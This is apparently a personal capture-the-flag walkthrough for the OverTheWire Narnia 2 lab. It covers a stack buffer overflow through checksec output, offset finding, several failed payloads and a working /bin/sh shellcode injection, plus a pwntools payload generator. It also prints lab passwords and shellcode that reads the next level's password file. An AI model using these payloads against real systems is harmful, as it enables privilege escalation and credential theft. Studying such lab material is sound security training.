---
title: narnia 2 walkthrough
description: over the wire narnia 2
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: narnia-2 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: narnia 2 walkthrough
    order: 30
---
## Description
> 

connect
```bash
$ ssh narnia2@narnia.labs.overthewire.org -p 2226
Zzb6MIyceT
```
execute
```bash
$ /narnia/narnia2
Usage: /narnia/narnia2 argument
$ /narnia/narnia2 a
a
```

---
## Hint
- https://mks.tw/2984/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-shellcode-%E5%AF%A6%E4%BD%9C#%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE
- https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/
- https://tech-blog.cymetrics.io/posts/crystal/reverse-01/
- https://ctf101.org/binary-exploitation/what-is-the-got/

---

## Progress
First check the security properties.
```bash
$ checksec /narnia/narnia2
[*] '/narnia/narnia2'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```
All the security properties are closed.
Check the size of shellcode payload. The payload is 63 bytes long.
```nash
shellcraft -f r cat /etc/narnia_pass/narnia3 | wc
      0       2      63
```
Create a pattern to locate the injection point.
```bash
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
Program received signal SIGSEGV, Segmentation fault.
0x62616169 in ?? ()
gef➤  pattern search 0x62616169
[+] Searching for '69616162'/'62616169' with period=4
[+] Found at offset 132 (little-endian search) likely
```

### Failed Payload
Failed Payload :
```
`{ shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf 'a%0.s' {1..69}; python3 -c 'print("\x98\xd0\xff\xff")' ;}`
```
python3 would print `\x98` as a unicode identifier. Therefore, the output would not be the raw hexidecimal string, as one thought.

Failed Payload 2:
```
`{ shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf 'a%0.s' {1..69}; printf '\x98\xd0\xff\xff' ;}`
```
Failed Payload 3:
```bash
`{ printf '\x90%0.s' {1..65}; shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf '\x90%0.s' {1..4}; printf '\x38\xd4\xff\xff' ;}`
```
Reason: The shellcode includes several push commands. After those commands were executed, the shellcode were overwritten. In other words, esp pointed to the shellcode.

### Success
[Success payload](https://axcheron.github.io/writeups/otw/narnia/):
```
$(printf '\x90%0.s' {1..100}; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; printf '\x90%0.s' {1..4}; printf '\x38\xd4\xff\xff')
```
However, 
```bash
narnia2@gibson:~$ /narnia/narnia2 $(printf '\x90%0.s' {1..50}; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; printf '\x90%0.s' {1..54}; printf '\x38\xd4\xff\xff')
$ whoami
narnia2
```
[reason](https://en.wikipedia.org/wiki/Setuid#Security_impact): many operating systems ignore the setuid attribute when applied to executable shell scripts.


Payload generator:
```python
from pwn import *

def asm2bytes(asm_str : str):
    return asm(asm_str)

def make_payload(raw_cmd):
    total_padding_num = 132
    back_padding_num = 50
    front_padding_num = total_padding_num - back_padding_num - len(raw_cmd)
    return front_padding_num * b"\x90" + raw_cmd + back_padding_num * b"\x90" + b"\x08\xd4\xff\xff"

def main():
    file_name = "/etc/narnia_pass/narnia3"
    cat = shellcraft.i386.linux.cat(file_name)
    raw_cat = asm2bytes(cat)
	# "hiii" is fine
	# "hiiia" failed
    echos = shellcraft.i386.linux.echo("hiiiabcd") 
    raw_echos = asm2bytes(echos)
    payload = make_payload(raw_echos)
    with open("raw", "wb") as f:
        f.write(payload)

main()
```
Script:
```bash
#/usr/bin/bash
python3 test.py
/narnia/narnia2 `cat raw`
8SyQ2wyEDU
```

---
## Solving

### Techniques
- [[shellcode]]

### Tools
- [[gef]]
- [[checksec]]
- ltrace